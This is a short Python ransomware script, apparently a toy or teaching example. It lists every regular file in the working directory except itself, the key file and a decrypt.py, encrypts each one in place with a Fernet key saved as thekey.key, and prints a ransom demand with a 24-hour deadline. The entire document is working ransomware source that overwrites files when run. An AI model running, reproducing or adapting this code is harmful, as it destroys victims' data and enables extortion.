#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Add files to the list
files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Printing every file on current directory
print(files)

# Creating the encryption key
key = Fernet.generate_key()

# Saving the key to a new file named "thekey.key"
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Loop through every file on the list and encrypting them
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All of your files have been encrypted. Send me $1, or say goodbye to your files. You have 24 hours from now:))")
